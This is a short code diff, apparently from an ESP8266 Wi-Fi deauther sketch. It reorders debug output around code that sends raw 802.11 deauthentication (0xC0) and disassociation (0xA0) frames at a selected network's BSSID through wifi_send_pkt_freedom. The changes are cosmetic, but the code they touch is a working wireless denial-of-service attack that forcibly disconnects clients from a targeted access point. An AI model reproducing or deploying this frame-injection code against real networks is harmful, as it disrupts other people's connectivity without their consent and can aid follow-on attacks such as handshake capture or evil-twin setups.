@@ -383,11 +383,13 @@ void loop() {
     memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
     deauthPacket[24] = 1;
 
-    Serial.println(bytesToStr(deauthPacket, 26));
+    // Deauthentication
     deauthPacket[0] = 0xC0;
-    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
     Serial.println(bytesToStr(deauthPacket, 26));
+    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
+    // Disassocation
     deauthPacket[0] = 0xA0;
+    Serial.println(bytesToStr(deauthPacket, 26));
     Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
 
     deauth_now = millis();
